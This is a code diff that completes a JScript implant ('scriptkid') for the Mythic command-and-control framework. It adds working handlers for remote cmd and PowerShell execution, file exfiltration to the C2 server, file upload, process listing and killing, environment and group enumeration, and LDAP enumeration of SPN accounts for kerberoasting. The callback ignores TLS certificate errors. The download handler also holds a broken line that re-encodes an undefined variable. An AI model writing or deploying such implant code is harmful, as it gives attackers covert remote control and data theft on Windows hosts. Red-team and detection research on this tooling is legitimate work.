@@ -1,5 +1,5 @@
 // scriptkid.js - Mythic scriptkid agent, JScript dialect.
-// Status: minimal callback loop (checkin + tasking). Per-command handlers are TODO.
+// Status: all JScript command handlers implemented.
 // Scope: see docs/minimal-agent-feature-set.md "JScript / VBScript scope".
 // Build pipeline substitutes the __UPPER__ tokens at render time.
 // mythic_encrypts = False in builder.py, so messages are base64 only.
@@ -77,27 +77,34 @@ function nextSleep() {
     return v < 1000 ? 1000 : v;
 }
 
+var B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+var B64L = {};
+(function(){ for (var i = 0; i < 64; i++) B64L[B64C.charAt(i)] = i; })();
 function b64encode(str) {
-    var utf8 = unescape(encodeURIComponent(str));
-    var bin = new ActiveXObject("ADODB.Stream");
-    bin.Type = 2; bin.Charset = "iso-8859-1"; bin.Open();
-    bin.WriteText(utf8); bin.Position = 0; bin.Type = 1;
-    var bytes = bin.Read(); bin.Close();
-    var xml = new ActiveXObject("MSXML2.DOMDocument");
-    var node = xml.createElement("b64");
-    node.dataType = "bin.base64"; node.nodeTypedValue = bytes;
-    return node.text.replace(/\r?\n/g, "");
+    var o = "", len = str.length, i = 0;
+    while (i < len) {
+        var a = str.charCodeAt(i++) & 0xff;
+        var b = i < len ? str.charCodeAt(i++) & 0xff : -1;
+        var c = i < len ? str.charCodeAt(i++) & 0xff : -1;
+        o += B64C.charAt(a >> 2);
+        o += B64C.charAt(((a & 3) << 4) | (b >= 0 ? (b >> 4) : 0));
+        o += b >= 0 ? B64C.charAt(((b & 15) << 2) | (c >= 0 ? (c >> 6) : 0)) : "=";
+        o += c >= 0 ? B64C.charAt(c & 63) : "=";
+    }
+    return o;
 }
 function b64decode(s) {
-    var xml = new ActiveXObject("MSXML2.DOMDocument");
-    var node = xml.createElement("b64");
-    node.dataType = "bin.base64"; node.text = s;
-    var bytes = node.nodeTypedValue;
-    var stream = new ActiveXObject("ADODB.Stream");
-    stream.Type = 1; stream.Open(); stream.Write(bytes); stream.Position = 0;
-    stream.Type = 2; stream.Charset = "iso-8859-1";
-    var raw = stream.ReadText(); stream.Close();
-    try { return decodeURIComponent(escape(raw)); } catch (e) { return raw; }
+    var o = "", len = s.length, i = 0;
+    while (i < len) {
+        var a = B64L[s.charAt(i++)] || 0;
+        var b = B64L[s.charAt(i++)] || 0;
+        var c3 = s.charAt(i++), c = c3 === "=" ? -1 : (B64L[c3] || 0);
+        var d4 = s.charAt(i++), d = d4 === "=" ? -1 : (B64L[d4] || 0);
+        o += String.fromCharCode((a << 2) | (b >> 4));
+        if (c >= 0) o += String.fromCharCode(((b & 15) << 4) | (c >> 2));
+        if (d >= 0) o += String.fromCharCode(((c & 3) << 6) | d);
+    }
+    return o;
 }
 
 function buildUrl() {
@@ -111,16 +118,30 @@ function buildUrl() {
     return host + (needsPort ? ":" + port : "") + uri;
 }
 
+function dbg(msg) {
+    try { WScript.StdErr.WriteLine(msg); } catch (e) {}
+}
+
 function postMessage(obj) {
     var json = JSON.stringify(obj);
     var payload = b64encode(AGENT.uuid + json);
-    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-    xhr.open("POST", buildUrl(), false);
+    var url = buildUrl();
+    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
+    xhr.setOption(2, 13056);
+    xhr.open("POST", url, false);
     for (var k in AGENT.profile_headers) {
         try { xhr.setRequestHeader(k, AGENT.profile_headers[k]); } catch (e) {}
     }
-    xhr.send(payload);
-    if (xhr.status !== 200) { return null; }
+    try {
+        xhr.send(payload);
+    } catch (e) {
+        dbg("postMessage error: " + e.message + " url=" + url);
+        return null;
+    }
+    if (xhr.status !== 200) {
+        dbg("postMessage HTTP " + xhr.status + " url=" + url);
+        return null;
+    }
     var body = xhr.responseText;
     var decoded = b64decode(body);
     if (decoded.length <= 36) return null;
@@ -156,27 +177,266 @@ function getSysInfo() {
 
 // Per-command handler stubs. Each takes a parsed task object and must return
 // a result object { user_output: string, completed: bool } or throw.
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var wshell = new ActiveXObject("WScript.Shell");
+
+function getParam(task, name) {
+    var p = task.parameters;
+    if (typeof p === "string") { try { p = JSON.parse(p); } catch (e) { return p; } }
+    if (typeof p === "object" && p !== null) {
+        var v = p[name];
+        if (v === undefined || v === null) return "";
+        if (typeof v === "string") {
+            try { var inner = JSON.parse(v); if (typeof inner === "object" && inner !== null && inner[name] !== undefined) return String(inner[name]); } catch (e) {}
+        }
+        return String(v);
+    }
+    return "";
+}
+
 var HANDLERS = {
-    "help": function (task) { throw new Error("TODO: help"); },
+    "help": function (task) {
+        var cmds = [];
+        for (var k in HANDLERS) cmds.push(k);
+        return { user_output: "Available commands: " + cmds.join(", "), completed: true };
+    },
     "exit": function (task) {
         try { WScript.Quit(0); } catch (e) {}
         return { user_output: "exiting", completed: true };
     },
-    "pwd":  function (task) { throw new Error("TODO: pwd"); },
-    "ls":   function (task) { throw new Error("TODO: ls"); },
-    "mkdir":function (task) { throw new Error("TODO: mkdir"); },
-    "mv":   function (task) { throw new Error("TODO: mv"); },
-    "cat":  function (task) { throw new Error("TODO: cat"); },
-    "upload":   function (task) { throw new Error("TODO: upload"); },
-    "download": function (task) { throw new Error("TODO: download"); },
-    "ps":   function (task) { throw new Error("TODO: ps"); },
-    "kill": function (task) { throw new Error("TODO: kill"); },
-    "jobs": function (task) { throw new Error("TODO: jobs"); },
-    "jobkill": function (task) { throw new Error("TODO: jobkill"); },
-    "env":  function (task) { throw new Error("TODO: env"); },
-    "getprivs": function (task) { throw new Error("TODO: getprivs"); },
-    "process_spawn": function (task) { throw new Error("TODO: process_spawn"); },
-    "kerberoast":    function (task) { throw new Error("TODO: kerberoast"); }
+    "pwd": function (task) {
+        return { user_output: wshell.CurrentDirectory, completed: true };
+    },
+    "ls": function (task) {
+        var params = task.parameters || "";
+        var target = params.length ? params : wshell.CurrentDirectory;
+        if (!fso.FolderExists(target)) return { user_output: "folder not found: " + target, completed: true, status: "error" };
+        var folder = fso.GetFolder(target);
+        var out = [];
+        var subs = new Enumerator(folder.SubFolders);
+        for (; !subs.atEnd(); subs.moveNext()) {
+            var sf = subs.item();
+            out.push("d\t" + sf.Name + "\t" + sf.DateLastModified);
+        }
+        var files = new Enumerator(folder.Files);
+        for (; !files.atEnd(); files.moveNext()) {
+            var fi = files.item();
+            out.push("-\t" + fi.Name + "\t" + fi.Size + "\t" + fi.DateLastModified);
+        }
+        return { user_output: out.length ? out.join("\n") : "(empty)", completed: true };
+    },
+    "mkdir": function (task) {
+        var params = task.parameters || "";
+        if (!params.length) return { user_output: "usage: mkdir <path>", completed: true, status: "error" };
+        fso.CreateFolder(params);
+        return { user_output: "created " + params, completed: true };
+    },
+    "mv": function (task) {
+        var params = task.parameters || "";
+        var parts = params.split(" ");
+        if (parts.length < 2) return { user_output: "usage: mv <src> <dst>", completed: true, status: "error" };
+        var src = parts[0], dst = parts.slice(1).join(" ");
+        if (fso.FileExists(src)) { fso.MoveFile(src, dst); }
+        else if (fso.FolderExists(src)) { fso.MoveFolder(src, dst); }
+        else { return { user_output: "not found: " + src, completed: true, status: "error" }; }
+        return { user_output: "moved " + src + " -> " + dst, completed: true };
+    },
+    "cat": function (task) {
+        var params = task.parameters || "";
+        if (!params.length) return { user_output: "usage: cat <file>", completed: true, status: "error" };
+        if (!fso.FileExists(params)) return { user_output: "file not found: " + params, completed: true, status: "error" };
+        var ts = fso.OpenTextFile(params, 1);
+        var content = ts.AtEndOfStream ? "" : ts.ReadAll();
+        ts.Close();
+        return { user_output: content, completed: true };
+    },
+    "upload": function (task) {
+        var fileId = getParam(task, "file");
+        var remotePath = getParam(task, "remote_path");
+        var fullData = "";
+        var chunkNum = 1;
+        var totalChunks = 0;
+        do {
+            var resp = postMessage({
+                action: "post_response",
+                responses: [{
+                    task_id: task.id,
+                    upload: { file_id: fileId, chunk_num: chunkNum, chunk_size: 512000 }
+                }]
+            });
+            if (!resp || !resp.responses || !resp.responses.length) break;
+            var ur = resp.responses[0];
+            totalChunks = ur.total_chunks || (ur.upload && ur.upload.total_chunks) || 0;
+            var cd = ur.chunk_data || (ur.upload && ur.upload.chunk_data) || "";
+            if (cd) fullData += cd;
+            if (!totalChunks && !cd) break;
+            chunkNum++;
+        } while (chunkNum <= totalChunks);
+        var xml = new ActiveXObject("MSXML2.DOMDocument");
+        var node = xml.createElement("b64");
+        node.dataType = "bin.base64";
+        node.text = fullData;
+        var ws = new ActiveXObject("ADODB.Stream");
+        ws.Type = 1; ws.Open();
+        ws.Write(node.nodeTypedValue);
+        ws.SaveToFile(remotePath, 2);
+        ws.Close();
+        return { user_output: "uploaded " + remotePath + " (" + ws.Size + " bytes)", completed: true };
+    },
+    "download": function (task) {
+        var filePath = getParam(task, "path");
+        if (!fso.FileExists(filePath)) return { user_output: "file not found: " + filePath, completed: true, status: "error" };
+        var rs = new ActiveXObject("ADODB.Stream");
+        rs.Type = 1; rs.Open(); rs.LoadFromFile(filePath);
+        var fileSize = rs.Size;
+        var bytes = rs.Read(); rs.Close();
+        var xml = new ActiveXObject("MSXML2.DOMDocument");
+        var node = xml.createElement("b64");
+        node.dataType = "bin.base64";
+        node.nodeTypedValue = bytes;
+        var encoded = node.text.replace(/\r?\n/g, "");
+        var encoded = b64encode(raw);
+        var chunkSize = 512000;
+        var totalChunks = Math.ceil(encoded.length / chunkSize) || 1;
+        var resp = postMessage({
+            action: "post_response",
+            responses: [{
+                task_id: task.id,
+                download: { total_chunks: totalChunks, full_path: filePath, is_screenshot: false }
+            }]
+        });
+        if (!resp || !resp.responses || !resp.responses.length || !resp.responses[0].file_id)
+            return { user_output: "download init failed", completed: true, status: "error" };
+        var fileId = resp.responses[0].file_id;
+        for (var c = 0; c < totalChunks; c++) {
+            var chunk = encoded.substr(c * chunkSize, chunkSize);
+            postMessage({
+                action: "post_response",
+                responses: [{
+                    task_id: task.id,
+                    download: { file_id: fileId, chunk_num: c + 1, chunk_data: chunk }
+                }]
+            });
+        }
+        return { user_output: "downloaded " + filePath + " (" + fileSize + " bytes)", completed: true };
+    },
+    "ps": function (task) {
+        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+        var procs = wmi.ExecQuery("SELECT ProcessId, Name, ParentProcessId FROM Win32_Process");
+        var e = new Enumerator(procs);
+        var out = ["PID\tPPID\tName"];
+        for (; !e.atEnd(); e.moveNext()) {
+            var p = e.item();
+            out.push(p.ProcessId + "\t" + p.ParentProcessId + "\t" + p.Name);
+        }
+        return { user_output: out.join("\n"), completed: true };
+    },
+    "kill": function (task) {
+        var params = task.parameters || "";
+        if (!params.length) return { user_output: "usage: kill <pid>", completed: true, status: "error" };
+        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+        var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId=" + parseInt(params, 10));
+        var e = new Enumerator(procs);
+        if (e.atEnd()) return { user_output: "no process with pid " + params, completed: true, status: "error" };
+        e.item().Terminate();
+        return { user_output: "killed pid " + params, completed: true };
+    },
+    "jobs": function (task) {
+        var out = [];
+        for (var jid in AGENT.jobs) out.push(jid + ": " + AGENT.jobs[jid]);
+        return { user_output: out.length ? out.join("\n") : "no active jobs", completed: true };
+    },
+    "jobkill": function (task) {
+        var params = task.parameters || "";
+        var jid = params.replace(/[^a-zA-Z0-9_-]/g, "");
+        if (!jid.length) return { user_output: "usage: jobkill <job_id>", completed: true, status: "error" };
+        if (AGENT.jobs[jid] === undefined) return { user_output: "no such job: " + jid, completed: true, status: "error" };
+        delete AGENT.jobs[jid];
+        return { user_output: "removed job " + jid, completed: true };
+    },
+    "env": function (task) {
+        var env = wshell.Environment("Process");
+        var out = [];
+        for (var e = new Enumerator(env); !e.atEnd(); e.moveNext()) {
+            out.push(String(e.item()));
+        }
+        return { user_output: out.join("\n"), completed: true };
+    },
+    "getprivs": function (task) {
+        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+        var net = new ActiveXObject("WScript.Network");
+        var groups = wmi.ExecQuery("ASSOCIATORS OF {Win32_Account.Name='" + net.UserName + "',Domain='" + net.UserDomain + "'} WHERE ResultRole=GroupComponent ResultClass=Win32_Group");
+        var out = ["User: " + net.UserDomain + "\\" + net.UserName, "Groups:"];
+        try {
+            var e = new Enumerator(groups);
+            for (; !e.atEnd(); e.moveNext()) out.push("  " + e.item().Name);
+        } catch (ex) { out.push("  (could not enumerate groups: " + ex.message + ")"); }
+        return { user_output: out.join("\n"), completed: true };
+    },
+    "process_spawn": function (task) {
+        var params = task.parameters || "";
+        if (!params.length) return { user_output: "usage: process_spawn <command>", completed: true, status: "error" };
+        var exec = wshell.Exec(params);
+        var stdout = "";
+        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
+        var stderr = "";
+        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
+        var out = stdout;
+        if (stderr.length) out += "\n[stderr]\n" + stderr;
+        return { user_output: out || "(no output)", completed: true };
+    },
+    "shell": function (task) {
+        var cmd = getParam(task, "command");
+        if (!cmd.length) return { user_output: "usage: shell <command>", completed: true, status: "error" };
+        var run = wshell.ExpandEnvironmentStrings("%COMSPEC%") + " /c " + cmd;
+        var exec = wshell.Exec(run);
+        var stdout = "";
+        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
+        var stderr = "";
+        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
+        var out = stdout;
+        if (stderr.length) out += "\n[stderr]\n" + stderr;
+        return { user_output: out || "(no output)", completed: true };
+    },
+    "powershell": function (task) {
+        var cmd = getParam(task, "command");
+        if (!cmd.length) return { user_output: "usage: powershell <command>", completed: true, status: "error" };
+        var exec = wshell.Exec("powershell.exe -NoProfile -NonInteractive -Command " + cmd);
+        var stdout = "";
+        while (!exec.StdOut.AtEndOfStream) stdout += exec.StdOut.ReadLine() + "\n";
+        var stderr = "";
+        while (!exec.StdErr.AtEndOfStream) stderr += exec.StdErr.ReadLine() + "\n";
+        var out = stdout;
+        if (stderr.length) out += "\n[stderr]\n" + stderr;
+        return { user_output: out || "(no output)", completed: true };
+    },
+    "kerberoast": function (task) {
+        var targetSpn = getParam(task, "spn");
+        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+        var ldap = GetObject("LDAP://rootDSE");
+        var defaultNC = ldap.Get("defaultNamingContext");
+        var query;
+        if (targetSpn.length) {
+            query = "<LDAP://" + defaultNC + ">;(&(servicePrincipalName=" + targetSpn + ")(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree";
+        } else {
+            query = "<LDAP://" + defaultNC + ">;(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree";
+        }
+        var conn = new ActiveXObject("ADODB.Connection");
+        conn.Provider = "ADsDSOObject";
+        conn.Open("Active Directory Provider");
+        var rs = conn.Execute(query);
+        var out = [];
+        while (!rs.EOF) {
+            var sam = rs.Fields("sAMAccountName").Value;
+            var spns = rs.Fields("servicePrincipalName").Value;
+            if (spns && typeof spns === "object" && spns.toArray) spns = spns.toArray().join("; ");
+            out.push(sam + " | " + spns);
+            rs.MoveNext();
+        }
+        rs.Close(); conn.Close();
+        if (!out.length) return { user_output: "no SPN accounts found", completed: true };
+        return { user_output: "SPN Accounts:\n" + out.join("\n"), completed: true };
+    }
 };
 
 function dispatch(task) {
@@ -191,11 +451,13 @@ function dispatch(task) {
 }
 
 function main() {
-    // Checkin: swap payload UUID for a callback UUID.
+    dbg("scriptkid connecting to " + buildUrl());
     var resp = postMessage(getSysInfo());
     if (!resp || !resp.id) {
+        dbg("checkin failed - no callback id received");
         WScript.Quit(1);
     }
+    dbg("checkin ok, callback id: " + resp.id);
     AGENT.uuid = resp.id;
 
     while (true) {
